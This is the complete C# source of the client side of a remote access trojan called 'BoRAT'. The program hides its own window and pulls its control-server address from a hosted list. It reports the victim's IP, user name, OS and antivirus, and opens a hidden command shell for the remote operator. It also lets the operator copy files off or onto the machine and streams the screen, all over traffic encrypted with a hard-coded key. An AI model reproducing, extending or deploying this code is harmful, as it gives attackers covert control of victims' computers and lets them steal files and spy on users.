using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Management;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace BoRAT.Client
{
    public partial class frmMain : Form
    {
        string _ip = "127.0.0.1", _port = "999", _delay = "5000", _noip = "no";
        Socket clientSocket = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);

        int port { get; set; }
        int delay {get; set; }
        IPAddress ipAddress { get; set; }

        //Cmd Shell
        bool isStarted;
        StreamWriter writeInput;
        StreamReader readOuput, errorOutput;

        //FileManager
        int fupSize = 0;
        int writeSize = 0;
        string fdl_location = "";
        string fup_location = "";
        bool isFileUpload { get; set; }
        byte[] receivedFile = new byte[1];

        //Rdp
        bool isRdpStop { get; set; }

        public frmMain()
        {
            InitializeComponent();

            using (WebClient client = new WebClient())
            {
                string s = client.DownloadString("https://borat-admin.github.io/site/serverList.txt");

                string[] list = s.Split(':');

                _ip = list[0];
                _port = list[1];
            }

            port = int.Parse(_port);
            delay = int.Parse(_delay);
            ipAddress = IPAddress.Parse(_ip);

        }

        private void FrmMain_Shown(object sender, EventArgs e)
        {
            Thread coreThread = new Thread(new ThreadStart(startConnection));
            coreThread.Start();
        }

        private void startConnection()
        {
            while(true)
            {
                if (clientSocket.Connected)
                    receiveInfo();
                else
                    makeConnection();
            }
        }

        private void receiveInfo()
        {
            byte[] buffer = new byte[1024];
            int received = 0;

            try
            {
                received = clientSocket.Receive(buffer);
            }
            catch (SocketException)
            {
                clientSocket.Close();
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                makeConnection();
            }

            if (received == 0)
                return;

            byte[] data = new byte[received];
            Array.Copy(buffer, data, received);

            if (isFileUpload)
            {
                processUploadRequest(data);
                //processUploadRequest(data);
            }

            if(!isFileUpload)
                processNormalRequest(data);
        }

        private void makeConnection()
        {
            while(!clientSocket.Connected)
            {
                try
                {
                    if(_noip.Equals("no"))
                        clientSocket.Connect(new IPEndPoint(ipAddress, port));
                    
                    else if(_noip.Equals("yes"))
                        clientSocket.Connect(Dns.GetHostAddresses(_ip), port);

                    Thread.Sleep(delay);
                }
                catch (SocketException) {
                    using (WebClient client = new WebClient())
                    {
                        
                        string s = client.DownloadString("https://borat-admin.github.io/site/serverList.txt");
                        Console.WriteLine(s);

                        string[] list = s.Split(':');

                        _ip = list[0];
                        _port = list[1];

                        Console.WriteLine(list[0]);
                        Console.WriteLine(list[1]);
                    }

                    port = int.Parse(_port);
                    delay = int.Parse(_delay);
                    ipAddress = IPAddress.Parse(_ip);
                };
            }
        }

        private string getPublicIPAddress()
        {
            string pubIP = new WebClient().DownloadString("https://api.ipify.org");
            return pubIP;
        }

        private string getUserName()
        {
            string machinName = Environment.UserName;
            return machinName;

        }

        private string getOsName()
        {
            string osName;
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            osName = (string)key.GetValue("productName");
            return osName;
        }

        private string getAvName()
        {
            string avName = "";
            try
            {
                bool windowsDefender = false;
                string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                var instances = searcher.Get();
                avName = "";
                foreach (var instance in instances)
                {
                    if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
                        windowsDefender = true;
                    if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                    {
                        avName = instance.GetPropertyValue("displayName").ToString();
                    }

                }
                if (avName.Equals(string.Empty) && windowsDefender)
                    avName = "Windows Defender";
                if (avName == "") avName = "N/A";
            }
            catch (Exception)
            {
                avName = "N/A";
            }
            return avName;
        }

        private string getTimeDate()
        {
            string TimeDate = DateTime.Now.ToString();
            return TimeDate;
        }

        private void processNormalRequest(byte[] data)
        {
            string cmd = Encoding.Unicode.GetString(data);
            cmd = Decrypt(cmd);
            if (cmd.Contains("getInfo"))
            {
                string id = cmd.Split('~')[1];
                string information, pubIp, userName, osName, avName, timeDate;
                pubIp = getPublicIPAddress();
                userName = getUserName();
                osName = getOsName();
                avName = getAvName();
                timeDate = getTimeDate();

                information = id + "~" + pubIp + "~" + userName +
                               "~" + osName + "~" + avName + "~" +
                               timeDate;
                string sendInfo = "infoBack|" + information;

                sendCommand(sendInfo);
            }

            else if (cmd.Equals("startCmd"))
            {
                isStarted = true;

                ProcessStartInfo pInfo = new ProcessStartInfo();
                pInfo.FileName = "cmd.exe";
                pInfo.CreateNoWindow = true;
                pInfo.UseShellExecute = false;
                pInfo.RedirectStandardInput = true;
                pInfo.RedirectStandardOutput = true;
                pInfo.RedirectStandardError = true;

                Process p = new Process();
                p.StartInfo = pInfo;
                p.Start();
                writeInput = p.StandardInput;
                readOuput = p.StandardOutput;
                errorOutput = p.StandardError;
                writeInput.AutoFlush = true;

                Thread cmdShellThread = new Thread(new ThreadStart(runCmdShellCommands));
                cmdShellThread.Start();
            }

            else if (cmd.StartsWith("cmd§"))
            {
                if (isStarted)
                {
                    string strCmd = cmd.Split('§')[1];
                    writeInput.WriteLine(strCmd + "\r\n");
                }

                else
                {
                    sendError("cmdFaild\n");
                }
            }

            else if (cmd.Equals("drivesList"))
            {
                string dataToSend = "drivesList~";
                DriveInfo[] drivers = DriveInfo.GetDrives();

                foreach (DriveInfo d in drivers)
                {
                    try
                    {
                        if (d.IsReady)
                            dataToSend += d.Name + "|" + d.TotalSize + "\n";
                        else
                            dataToSend += d.Name + "\n";
                    }

                    catch (UnauthorizedAccessException ex)
                    {
                        sendError("FileManager Error!\n" + ex.Message);
                    }

                    catch (IOException ex)
                    {
                        sendError("FileManager Error!\n" + ex.Message);
                    }
                }

                sendCommand(dataToSend);
            }

            else if (cmd.StartsWith("enterPath~"))
            {
                bool checkPath = false;
                string path = cmd.Split('~')[1];

                if (path.Length == 3 && path.Contains(":\\"))
                    checkPath = true;
                else if (!checkPath && Directory.Exists(path))
                    checkPath = true;
                else
                {
                    sendError("Directory Not Found\n");
                    return;
                }

                Thread enterDir = new Thread(() => enterDirectory(path));
                enterDir.Start();

            }

            else if (cmd.StartsWith("backPath~"))
            {
                string path = cmd.Split('~')[1];

                if (path.Length == 3 && path.Contains(":\\"))
                {
                    sendCommand("backPath~driveList");
                }
                else
                {
                    path = new DirectoryInfo(path).Parent.FullName;
                    sendCommand("backPath~" + path);
                }

            }

            else if (cmd.StartsWith("fdl~"))
            {
                string info = cmd.Split('~')[1];
                if (File.Exists(info))
                {
                    fdl_location = info;
                    try
                    {
                        string size = new FileInfo(info).Length.ToString();
                        sendCommand("fInfo~" + size);
                    }
                    catch (Exception ex)
                    {
                        sendError("Access Error!.\n" + ex.Message + "\n");
                    }

                }
                else
                {
                    sendError("File Not Found\n");
                }
            }

            else if (cmd.Equals("fdlConfirm"))
            {
                try
                {
                    byte[] dataToSend = File.ReadAllBytes(fdl_location);
                    sendFile(dataToSend);
                }
                catch (Exception ex)
                {
                    sendError("Access Error!.\n" + ex.Message + "\n");
                }
            }

            else if (cmd.StartsWith("fup~"))
            {
                fup_location = cmd.Split('~')[1];
                if (!File.Exists(fup_location))
                {
                    fupSize = int.Parse(cmd.Split('~')[2]);
                    receivedFile = new byte[fupSize];
                    sendCommand("fupConfirm");
                    isFileUpload = true;
                }
                else
                {
                    sendError("File Already Exists.");
                }
            }

            else if (cmd.Equals("rdpStart"))
            {
                isRdpStop = false;
                Thread rdpThread = new Thread(new ThreadStart(streamScreen));
                rdpThread.Start();
            }

            else if (cmd.Equals("rdpStop"))
                isRdpStop = true;
        }

        private void processUploadRequest(byte[] data)
        {
            Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);

            writeSize += data.Length;

            if(receivedFile.Length==fupSize)
            {
                try
                {
                    using (FileStream fs = File.Create(fup_location))
                    {
                        byte[] info = receivedFile;
                        fs.Write(info, 0, info.Length);
                    }

                    Array.Clear(receivedFile, 0, receivedFile.Length);
                }
                catch(Exception ex)
                {
                    sendError("File Upload Error!\n" + ex.Message + "\n");
                }
                sendCommand("fileReceived");
                isFileUpload = false;
            }
        }

        private void sendCommand(string data)
        {
            try
            {
                string encrypt = Encrypt(data);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                makeConnection();
            }
        }

        private void sendFile(byte[] data)
        {
            try
            {
                clientSocket.Send(data);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                makeConnection();
            }
        }

        private void sendImage(byte[] data)
        {
            try
            {
                byte[] dataToSend = new byte[data.Length + 16];
                byte[] header = Encoding.Unicode.GetBytes("rdpImage");
                Buffer.BlockCopy(header, 0, dataToSend, 0, header.Length);
                Buffer.BlockCopy(data, 0, dataToSend, header.Length, data.Length);

                clientSocket.Send(dataToSend,0,dataToSend.Length,SocketFlags.None);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                makeConnection();
            }
        }
        private void sendError(string data)
        {
            try
            {
                string error = "error~" + data;
                string encrypt = Encrypt(error);
                byte[] dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch(Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                makeConnection();
            }
        }
        private void runCmdShellCommands()
        {
            try
            {
                String tmpData = "", tmpError = "",
                    strData = "", strError = "";

                while ((tmpData = readOuput.ReadLine()) != null)
                {
                    strData += tmpData + "\r";
                    //send command
                    sendCommand("cmdout§" + strData);
                    strData = "";
                }

                while ((tmpError = errorOutput.ReadLine()) != null)
                {
                    strError += tmpError + "\r";
                    sendCommand("cmdout§" + strError);
                    strError = "";
                }
            }

            catch (OutOfMemoryException ex)
            {
                sendError("Cmd Error!\n" + ex.Message + "\n");
            }

            catch (IOException ex)
            {
                sendError("Cmd Error!\n" + ex.Message + "\n");
            }

        }

        private void enterDirectory(string path)
        {
            try
            {
                string[] directories = Directory.GetDirectories(path);
                string[] files = Directory.GetFiles(path);

                string dir = "";
                string file = "";

                foreach (string d in directories)
                {

                    string size = "N/A";
                    string name = d.Replace(path, "");
                    string creationTime = Directory.GetCreationTime(path).ToString();
                    string info = name + "|" + size + "|" + creationTime + "|" + d;
                    dir += info + "\n";
                }

                foreach (string f in files)
                {
                    string size = new FileInfo(f).Length.ToString();
                    string name = Path.GetFileName(f);
                    string creationTime = File.GetCreationTime(f).ToString();
                    string info = name + "|" + size.ToString() + "|" + creationTime + "|" + f;
                    file += info + "\n";
                }

                string dataToSend = "enterPath~" + dir + file;

                sendCommand(dataToSend);
            }
            catch(ArgumentNullException)
            {
                sendError("Error in EnterPath\n");
            }
            catch(System.Security.SecurityException)
            {
                sendError("Security Error in EnterPath\n");
            }
            catch(ArgumentException)
            {
                sendError("Error in EnterPath\n");
            }
            catch(UnauthorizedAccessException)
            {
                sendError("Unauthorized Error in EnterPath\n");
            }
            catch(PathTooLongException)
            {
                sendError("Error in EnterPath.\nTry Enter With Cmd Shell\n");
            }
            catch(NotSupportedException)
            {
                sendError("Unkown Error in EnterPath\n");
            }
        }

        private void streamScreen()
        {
            while(!isRdpStop)
            {
                ImageConverter imgConverter = new ImageConverter();
                byte[] image = (byte[]) imgConverter.ConvertTo(desktopScreen(),typeof(byte[]));
                sendImage(image);
                Thread.Sleep(1000);
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            this.Hide();
        }

        private Bitmap desktopScreen()
        {
            try
            {
                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                System.Drawing.Bitmap screenshot = new System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                System.Drawing.Graphics graph = System.Drawing.Graphics.FromImage(screenshot);
                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, System.Drawing.CopyPixelOperation.SourceCopy);
                return screenshot;
            }
            catch (Exception)
            {
                return null;
            }
        }
        
        public string Encrypt(string clearText)
        {
            string EncryptionKey = "BoRAT_2022";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Rijndael encryptor = Rijndael.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "BoRAT_2022";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Rijndael encryptor = Rijndael.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }
    }
}
